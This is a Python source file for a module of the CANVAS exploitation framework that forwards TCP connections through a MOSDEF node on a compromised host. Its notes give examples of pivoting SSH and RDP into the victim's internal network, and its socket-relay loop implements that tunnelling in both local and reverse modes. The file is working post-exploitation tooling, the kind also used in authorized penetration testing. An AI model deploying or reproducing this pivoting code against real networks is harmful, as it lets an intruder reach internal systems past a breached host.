#! /usr/bin/env python

import sys
#covers both angles
if "." not in sys.path: sys.path.append(".")


from exploitutils import *
from canvasexploit import canvasexploit
import timeoutsocket
import select
from MOSDEFSock import MOSDEFSock

NAME="TCP Port Forwarding Via MOSDEF"
DESCRIPTION="This module allows you to foward TCP connections through a MOSDEF node."
DOCUMENTATION={}
DOCUMENTATION['Notes']="""The module can work in two modes.

LOCAL - Listens on a port on the LocalNode, and forwards the connection out the remote node to it's destination
This mode is used when you need to tunnel a connection into the network that a compromised host is in.
  
REMOTE - Listens on the remote MOSDEF node, and forwards the connection out the LocalNode to it's destination.
This mode is used when you need to tunnel a connection back from the compromised node to your local network.

The following parameters are used:
  Listen IP   : 0.0.0.0 (or specify local inteface IP)
  Listen Port : 8080 (The port to listen on)
  Connect Host: <target> (The IP address of the target endpoint)
  Connect Port: <port> (The port of the target endpoint)
  
EXAMPLE 1 - Tunnel SSH through a MOSDEF node to a server (192.168.1.10) local to the compromised machine.
  Listen on LOCAL
  Listen IP 0.0.0.0
  Listen Port 2222
  Connect Host 192.168.1.10
  Connect port 22
  
  ssh -l user -p 2222 localhost
  
EXAMPLE 2 - Tunnel RDP through a MOSDEF node to connect to itself
  Listen on LOCAL
  Listen IP 0.0.0.0
  Listen Port 3333
  Connect Host 127.0.0.1
  Connect port 3389
  
  mstsc /v:127.0.0.1:3333
"""

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Commands"

class theexploit(canvasexploit):
    def __init__(self):
        canvasexploit.__init__(self)
        self.result=""
        self.name=NAME
        self.port=8080
        self.bindaddr = '0.0.0.0'
        self.remotehost='127.0.0.1'
        self.remoteport=80  
        self.reverse = False
        
        return

    def getargs(self):
        """Get the arguments for this exploit"""
        self.port=int(self.argsDict.get("bindport",self.port))
        self.bindaddr=self.argsDict.get("bindip",self.bindaddr)
        self.remotehost=self.argsDict.get("connectip", self.remotehost)
        self.remoteport=int(self.argsDict.get("connectport", self.remoteport))
        where = self.argsDict.get("radiobuttonRemote_value")
        if where == "Remote":
            self.reverse = True

        
        self.host=self.target.interface
        self.bouncenode = self.argsDict.get('passednodes')[0]
        
    def socketLoop(self):
        MAXBUF=4096
           
        SOCK_SERVER="server"
        SOCK_MOSDEFSERVER="mosdefserver"
        SOCK_REGULAR="regular"
        SOCK_MOSDEF="mosdef"


        # Sockets that are up are eligable to be read. sockets that are closing are alive, but their sink is closed.
        STATE_UP="up"
        STATE_CLOSING="closing"
        STATE_CLOSED="closed"
        
        class SockPipe:
            def __init__(self, source, type, state, sink):
                self.source = source
                self.type = type
                self.state = state
                self.sink = sink
                self.buffer = ""
            def __str__(self):
                return "SockPipe %s %s src: %s sink: %s" % (self.type, self.state, self.source, self.sink)

        def newMOSDEFClient(server):
            try:
                client = server.accept()[0]
            except socket.error, i:
                self.log("WP> WP> Accept failed: %s" % i)

            if client == -1:
                return
            self.log("WP> New remote client connected")
            return client

        def newMOSDEFConnect(host,port):
            self.log("WP> Connecting outbound from remote node...") 
            fwdsock = self.gettcpsock()
            try:
                fwdsock.connect((host,port))
            except (timeoutsocket.Timeout, socket.error), i:
                self.log("WP> Failed to connect to %s:%d: %s" % (host, port, i))
                return
            return fwdsock

        def newLocalConnect(host,port):
            self.log("WP> Connecting outbound from local node...") 
            fwdsock = socket.socket()
            try:
                fwdsock.connect((host,port))
            except socket.error, i:
                self.log("WP> Failed to connect to %s:%d: %s" % (host, port, i))
                return
            return fwdsock

        def newLocalClient(server):
            try:
                client = server.accept()[0]                
                self.log("WP> New local client connected")
                client.setblocking(False)
                return client
            except socket.error, i:
                self.log("WP> Failed to accept: %s"% i)
                return 

        self.setProgress(50)
        sockets = {}
        if not self.reverse:
            self.log("WP> Listening on local host %s port %d"%(self.bindaddr,self.port))
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                s.bind((self.bindaddr, self.port)) 
                s.listen(5)
            except socket.error, i:
                self.log("WP> Failed to setup local listener: %s" % i)
                return False
        
            sockets[s]=SockPipe(s, SOCK_SERVER, STATE_UP, None)
        else:
            self.log("WP> Listening on remote host %s port %d"%(self.bindaddr,self.port))
            # This doesnt work on non win32, cauase it calls mosdefsock's bind
            # which calls self.shell.bind(), which doesnt exist on nonwin32. 
            #s = self.gettcplistener(self.port, self.bindaddr)

            # getListenSock however, appears to be universal.
            # 
            fd = self.bouncenode.shell.getListenSock(self.bindaddr, self.port)
            if fd >= 0:
                s = MOSDEFSock(fd, self.bouncenode.shell)
            else:
                self.log("WP> Failed to setup remote listener")
                return False
            
            sockets[s]=SockPipe(s, SOCK_MOSDEFSERVER, STATE_UP, None)

        
        self.setInfo("%s - Forwarding sockets"%(NAME))
        self.setProgress(100)
        singleremoteflag=0
        while self.getState() != self.HALT:
            
            if (singleremoteflag==0):
                # Handle incoming connects on MOSDEF listeners
                new = {}
                for s in sockets.itervalues():
                    if s.type == SOCK_MOSDEFSERVER:
                        nc = newMOSDEFClient(s.source)
                        if nc != None:
                            nf = newLocalConnect(self.remotehost, self.remoteport)
                            if nf == None:
                                nc.close()
                            else:
                                singleremoteflag=1
                                new[nc] = SockPipe(nc, SOCK_MOSDEF, STATE_UP, nf)
                                new[nf] = SockPipe(nf, SOCK_REGULAR, STATE_UP, nc)
    
                sockets.update(new)
                            

            # Read from all MOSDEF sockets
            for s in sockets.itervalues():
                if s.type == SOCK_MOSDEF and s.state == STATE_UP and len(s.buffer) < MAXBUF:
                    #print "Reading from %s" % s
                    try:
                        s.buffer += s.source.read_eager()
                    except socket.error:
                        self.log("WP> Forwarded end closed connection")
                        singleremoteflag=0
                        s.state = STATE_CLOSED
                        s.source.close()
                        # Set sink sock's state to closing
                        sockets[s.sink].state = STATE_CLOSING
                    except timeoutsocket.Timeout:
                        pass

            # Put all non MOSDEF sockets into select for read/write
            readers = []
            writers = []
            errors = []
            
            for s in sockets.itervalues():
                if s.type == SOCK_SERVER:
                    readers.append(s.source)
                elif s.type == SOCK_REGULAR and s.state == STATE_UP and len(s.buffer) < MAXBUF:
                    readers.append(s.source)
                # If the buffer has data in it, and the sink socket is not mosdef
                if len(s.buffer) and sockets[s.sink].type == SOCK_REGULAR:
                    writers.append(s.sink)
            
            if len(readers) or len(writers) or len(errors):
                r,w,e = select.select(readers,writers,errors, 0.05)
            else:
                r=[]
                w=[]
                e=[]
                        
            for i in r:
                s = sockets[i]
                #print "Handling select() read from %s" % s

                if s.type == SOCK_SERVER:
                    nc = newLocalClient(i)
                    nf = newMOSDEFConnect(self.remotehost, self.remoteport)
                    if nf == None:
                        nc.close()
                    else:
                        sockets[nc] = SockPipe(nc, SOCK_REGULAR, STATE_UP, nf)
                        sockets[nf] = SockPipe(nf, SOCK_MOSDEF, STATE_UP, nc)
                elif s.type == SOCK_REGULAR:
                    try:
                        d = i.recv(1024)
                    except socket.error:
                        d = ""

                    if len(d):
                        s.buffer += d
                    else:
                        i.close()
                        s.state = STATE_CLOSED
                        sockets[s.sink].state = STATE_CLOSING
            
            for s in sockets.itervalues():
                # Write data to regular sockets that select marked writable, or MOSDEF sockets.
                if s.sink in w or  len(s.buffer) and sockets[s.sink].type == SOCK_MOSDEF and sockets[s.sink].state in [STATE_UP, STATE_CLOSING]:
                    #print "Handling select() write for %s" % s
                    try:
                        nw = s.sink.send(s.buffer)
                        s.buffer = s.buffer[nw:]
                    except socket.error, i:
                        self.log("WP> Socket error sending: %s" % i)
                        s.state = STATE_CLOSING
                        s.buffer = ""

                # If I'm in closing, and my source's buffer is empty, then I sould close
                if s.state == STATE_CLOSING and len(sockets[s.sink].buffer) == 0:
                    s.state == STATE_CLOSED
                    s.source.close()

            # Remove sockets where both sides are closed        
            reap = []
            for s in sockets.itervalues():
                if s.state == STATE_CLOSED and sockets[s.sink].state == STATE_CLOSED:
                    reap.append(s.source)

            for i in reap:
                singleremoteflag=0
                del sockets[i]

        # shutdown anything left        
        for s in sockets.iterkeys():
            s.close()

        self.setInfo("%s - done (finished)"%(NAME))
        return True
           

    def run(self):
        self.setInfo("%s (in progress)"%(NAME))
        self.getargs()

        rv = self.socketLoop()
        if rv:
            self.setInfo("%s - done (finished)"%(NAME))
            return 1
        else:
            self.setInfo("%s - done (failed)" % (NAME))
            return 0


def usage():
    app=theexploit()
    print "Usage: "+sys.argv[0]+" [-T (for test)] -t target [-p port:"+str(app.port)+"] [-v version:1] -l localip -d localport "

    app.displayVersions()
    sys.exit()


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    
